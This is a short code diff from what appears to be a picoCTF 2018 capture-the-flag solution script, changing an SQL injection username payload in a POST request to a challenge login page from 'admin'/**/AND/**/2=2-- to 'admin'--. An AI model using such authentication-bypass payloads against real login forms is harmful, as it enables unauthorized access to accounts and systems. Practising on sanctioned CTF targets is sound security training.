@@ -8,7 +8,7 @@ sys.setdefaultencoding('utf-8')
 
 r=requests.post('http://2018shell3.picoctf.com:22430/login.php',
   data={
-    'username':"admin'/**/AND/**/2=2--",
+    'username':"admin'--",
     'password':"as",
     'debug':"1"
   }
